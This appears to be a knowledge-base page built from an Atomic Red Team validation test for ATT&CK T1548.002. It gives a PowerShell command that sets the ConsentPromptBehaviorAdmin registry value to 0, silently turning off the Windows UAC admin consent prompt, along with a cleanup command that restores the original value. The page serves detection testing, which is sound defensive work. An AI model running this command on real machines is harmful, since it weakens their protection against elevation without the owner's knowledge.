---
atomic_guid: "251c5936-569f-42f4-9ac2-87a173b9e9b8"
title: "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "251c5936-569f-42f4-9ac2-87a173b9e9b8"
  - "Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key

Disable User Account Conrol (UAC) for admin by setting the registry key 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin to 0.

[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), 
[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), 
[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)

## Metadata

- Atomic GUID: 251c5936-569f-42f4-9ac2-87a173b9e9b8
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
$orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
```

### Cleanup

```powershell
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value $orgValue -Type Dword -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
